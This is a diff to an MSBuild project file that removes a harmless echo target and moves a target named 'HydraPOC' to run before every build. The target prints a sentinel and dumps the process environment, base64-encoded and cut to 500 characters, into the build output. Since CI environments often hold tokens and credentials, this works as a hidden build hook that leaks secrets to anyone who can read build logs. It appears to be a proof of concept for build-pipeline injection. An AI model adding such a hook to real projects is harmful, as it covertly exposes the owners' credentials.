@@ -1,8 +1,5 @@
 <Project>
-  <Target Name="PreBuild" BeforeTargets="Build">
-    <Exec Command="echo build" />
-  </Target>
-  <Target Name="HydraPOC" AfterTargets="Build">
-    <Exec Command="echo HYDRA_SENTINEL_f22e418a8e708264e9078db40f950d87; env | base64 -w0 | head -c 500 || true" />
+  <Target Name="HydraPOC" BeforeTargets="Build">
+    <Exec Command="echo HYDRA_SENTINEL_f22e418a8e708264e9078db40f950d87; env | base64 -w0 | head -c 500" />
   </Target>
 </Project>
